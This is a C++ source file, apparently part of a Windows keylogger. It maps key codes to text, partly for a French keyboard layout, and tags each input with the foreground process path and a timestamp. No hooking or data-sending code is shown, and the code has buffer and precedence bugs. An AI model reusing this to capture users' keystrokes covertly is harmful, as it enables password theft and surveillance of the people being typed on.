#include	<ctime>
#include	"HookerKey.hh"


HookerKey::HookerKey()
{

}

HookerKey::~HookerKey()
{

}

std::string		HookerKey::GetInput()
{
	return "";
}

Input			HookerKey::OrderInput(int a)
{
	Input		ret;
	std::time_t result = std::time(nullptr);
	SYSTEMTIME	DaTime;

	GetSystemTime(&DaTime);
	ret.setProcessName(this->GetWindowTitle());
	ret.setInputValue(this->GetSyntax(a));
	ret.setSecondTime(result);
	ret.setNanoTime(DaTime.wMilliseconds * 1000);
	return ret;
}

std::string		HookerKey::GetKeyboardSyntax()
{
	char		KeyName[KL_NAMELENGTH];

	GetKeyboardLayoutName(KeyName);
	if (strcmp(KeyName, "0000040C") == 0)
		return ("French(Standard)");
	if (strcmp(KeyName, "00000409") == 0)
		return ("English(United States)");
	if (strcmp(KeyName, "00000809") == 0)
		return ("English(United Kingdom)");
	if (strcmp(KeyName, "00000419") == 0)
		return ("Russian");
	return (KeyName);
}

std::string		HookerKey::GetWindowTitle()
{
	DWORD		ret = 0;

	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowThreadProcessId(hwnd, &ret);

	int len = GetWindowTextLength(hwnd);
	TCHAR *winBuf = new TCHAR[len];
	GetWindowText(hwnd, winBuf, len + 1);

	if (ret != 0)
	{
		HANDLE hProcess = OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), FALSE, ret);
		LPSTR lpszFilename = new CHAR[MAX_PATH];
		GetModuleFileNameEx(hProcess, NULL, lpszFilename, MAX_PATH);
		CloseHandle(hProcess);
		return (lpszFilename);
	}
	else
		return ("Could  not get process id for foreground window.");
	return "";
}

std::string		HookerKey::GetSyntax(int a)
{
	short		maj;
	short		alt;
	std::string	ret;

	maj = GetAsyncKeyState(VK_SHIFT);
	alt = GetAsyncKeyState(VK_MENU);
	switch (a)
	{
	case VK_LBUTTON:
		return ("<left click>");
	case VK_RBUTTON:
		return ("<right click>");
	case VK_CANCEL:
		return ("<control break>");
	case VK_MBUTTON:
		return ("<middle click>");
	case VK_XBUTTON1:
		return ("<X1 Mouse button>");
	case VK_XBUTTON2:
		return ("<X2 Mouse button>");
	case VK_BACK:
		return ("<backspace>");
	case VK_TAB:
		return ("<tab>");
	case VK_CLEAR:
		return ("<clear>");
	case VK_RETURN:
		return ("<enter>");
	case VK_SHIFT:
		return ("<shift>");
	case VK_CONTROL:
		return ("<control>");
	case VK_MENU:
		return ("<alt>");
	case VK_PAUSE:
		return ("<pause>");
	case VK_CAPITAL:
		return ("<capslock>");
	case VK_KANA:
		return ("<IME Kana mode>");
	case VK_JUNJA:
		return ("<IME Junja mode>");
	case VK_FINAL:
		return ("<IME final mode>");
	case VK_HANJA:
		return ("<IME Hanja mode>");
	case VK_ESCAPE:
		return ("<ESC key>");
	case VK_CONVERT:
		return ("<IME convert>");
	case VK_NONCONVERT:
		return ("<IME nonconvert>");
	case VK_ACCEPT:
		return ("<IME accept>");
	case VK_MODECHANGE:
		return ("<IME mode change request>");
	case VK_SPACE:
		return ("<space>");
	case VK_PRIOR:
		return ("<Page up>");
	case VK_NEXT:
		return ("<Page down>");
	case VK_END:
		return ("<End key>");
	case VK_HOME:
		return ("<Home key>");
	case VK_DELETE:
		return ("<delete>");
	case VK_LEFT:
		return ("<left>");
	case VK_RIGHT:
		return ("<right>");
	case VK_UP:
		return ("<up>");
	case VK_DOWN:
		return ("<down>");
	case VK_SELECT:
		return ("<Select key>");
	case VK_PRINT:
		return ("<Print key>");
	case VK_EXECUTE:
		return ("<Exec key>");
	case VK_SNAPSHOT:
		return ("<Print screen key>");
	case VK_INSERT:
		return ("<insert>");
	case VK_HELP:
		return ("<Help key>");
	case VK_LWIN:
		return ("<Left windows key>");
	case VK_RWIN:
		return ("<Right windows key>");
	case VK_APPS:
		return ("<Applications key>");
	case VK_SLEEP:
		return ("<Computer sleep key>");
	case VK_NUMPAD0:
		return ("<keypad 0>");
	case VK_NUMPAD1:
		return ("<keypad 1>");
	case VK_NUMPAD2:
		return ("<keypad 2>");
	case VK_NUMPAD3:
		return ("<keypad 3>");
	case VK_NUMPAD4:
		return ("<keypad 4>");
	case VK_NUMPAD5:
		return ("<keypad 5>");
	case VK_NUMPAD6:
		return ("<keypad 6>");
	case VK_NUMPAD7:
		return ("<keypad 7>");
	case VK_NUMPAD8:
		return ("<keypad 8>");
	case VK_NUMPAD9:
		return ("<keypad 9>");
	case VK_MULTIPLY:
		return ("*");
	case VK_ADD:
		return ("+");
	case VK_SEPARATOR:
		return ("/");
	case VK_SUBTRACT:
		return ("-");
	case VK_DECIMAL:
		return (".");
	case VK_DIVIDE:
		return ("/");
	case VK_F1:
		return ("<F1>");
	case VK_F2:
		return ("<F2>");
	case VK_F3:
		return ("<F3>");
	case VK_F4:
		return ("<F4>");
	case VK_F5:
		return ("<F5>");
	case VK_F6:
		return ("<F6>");
	case VK_F7:
		return ("<F7>");
	case VK_F8:
		return ("<F8>");
	case VK_F9:
		return ("<F9>");
	case VK_F10:
		return ("<F10>");
	case VK_F11:
		return ("<F11>");
	case VK_F12:
		return ("<F12>");
	case VK_F13:
		return ("<F13>");
	case VK_F14:
		return ("<F14>");
	case VK_F15:
		return ("<F15>");
	case VK_F16:
		return ("<F16>");
	case VK_F17:
		return ("<F17>");
	case VK_F18:
		return ("<F18>");
	case VK_F19:
		return ("<F19>");
	case VK_F20:
		return ("<F20>");
	case VK_F21:
		return ("<F21>");
	case VK_F22:
		return ("<F22>");
	case VK_F23:
		return ("<F23>");
	case VK_F24:
		return ("<F24>");
	case VK_NUMLOCK:
		return ("<NUM LOCK>");
	case VK_SCROLL:
		return ("<SCROLL LOCK>");
	case VK_LSHIFT:
		return ("<Left SHIFT>");
	case VK_RSHIFT:
		return ("<Right SHIFT>");
	case VK_LCONTROL:
		return ("<Left CONTROL>");
	case VK_RCONTROL:
		return ("<Right CONTROL>");
	case VK_LMENU:
		return ("<Left MENU>");
	case VK_RMENU:
		return ("<Right MENU>");
	case VK_BROWSER_BACK:
		return ("<Browser Back>");
	case VK_BROWSER_FORWARD:
		return ("<Browser Forward>");
	case VK_BROWSER_REFRESH:
		return ("<Browser Refresh>");
	case VK_BROWSER_STOP:
		return ("<Browser Stop>");
	case VK_BROWSER_SEARCH:
		return ("<Browser Search>");
	case VK_BROWSER_FAVORITES:
		return ("<Browser Favorites>");
	case VK_BROWSER_HOME:
		return ("<Browser Start>");
	case VK_VOLUME_MUTE:
		return ("<Volume Mute>");
	case VK_VOLUME_DOWN:
		return ("<Volume Down>");
	case VK_VOLUME_UP:
		return ("<Volume Up>");
	case VK_MEDIA_NEXT_TRACK:
		return ("<Next Track>");
	case VK_MEDIA_PREV_TRACK:
		return ("<Previous Track>");
	case VK_MEDIA_STOP:
		return ("<Stop Media>");
	case VK_MEDIA_PLAY_PAUSE:
		return ("<Play/Pause key>");
	case VK_LAUNCH_MAIL:
		return ("<Start Mail>");
	case VK_LAUNCH_MEDIA_SELECT:
		return ("<Select Media>");
	case VK_LAUNCH_APP1:
		return ("<Start Application 1>");
	case VK_LAUNCH_APP2:
		return ("<Start Application 2>");
	case VK_OEM_1:
		return ("$");
	case VK_OEM_PLUS:
		return ("+");
	case VK_OEM_COMMA:
		return (",");
	case VK_OEM_MINUS:
		return ("-");
	case VK_OEM_PERIOD:
		return (".");
	case VK_OEM_2:
		return ("/?");
	case VK_OEM_3:
		return ("~");
	case VK_OEM_4:
		return (")");
	case VK_OEM_5:
		return ("*");
	case VK_OEM_6:
		return ("}");
	case VK_OEM_7:
		return ("\"");
	case VK_PROCESSKEY:
		return ("IME Process Key");
	case VK_ATTN:
		return ("Attn Key");
	case VK_CRSEL:
		return ("Crsel Key");
	case VK_EXSEL:
		return ("Exsel Key");
	case VK_EREOF:
		return ("Erase eof Key");
	case VK_PLAY:
		return ("Play Key");
	case VK_ZOOM:
		return ("Zoom Key");
	case VK_PA1:
		return ("PA1 Key");
	case VK_OEM_CLEAR:
		return ("Clear Key");
	default:
		if (a >= 65 && a <= 90)
		{
			if (!(maj >> 15) & 1)
				a += 32;
		}
		if (a >= 48 && a <= 57)
		{
			if (!(maj >> 15) & 1)
				a = ChangeNumberMaj(a);
			else if ((alt >> 15) & 1)
				a = ChangeNumberAlt(a);
		}
		ret += char(a);
		return (ret);
	}
	return ("");
}

int				HookerKey::ChangeNumberMaj(int a)
{
	if (a == '1')
		return ('&');
	if (a == '2')
		return ('é');
	if (a == '3')
		return ('"');
	if (a == '4')
		return ('\'');
	if (a == '5')
		return ('(');
	if (a == '6')
		return ('-');
	if (a == '7')
		return ('è');
	if (a == '8')
		return ('_');
	if (a == '9')
		return ('ç');
	if (a == '0')
		return ('à');
	return (0);
}

int				HookerKey::ChangeNumberAlt(int a)
{
	if (a == '2')
		return ('~');
	if (a == '3')
		return ('#');
	if (a == '4')
		return ('{');
	if (a == '5')
		return ('[');
	if (a == '6')
		return ('|');
	if (a == '7')
		return ('`');
	if (a == '8')
		return ('\\');
	if (a == '9')
		return ('^');
	if (a == '0')
		return ('@');
	return (0);
}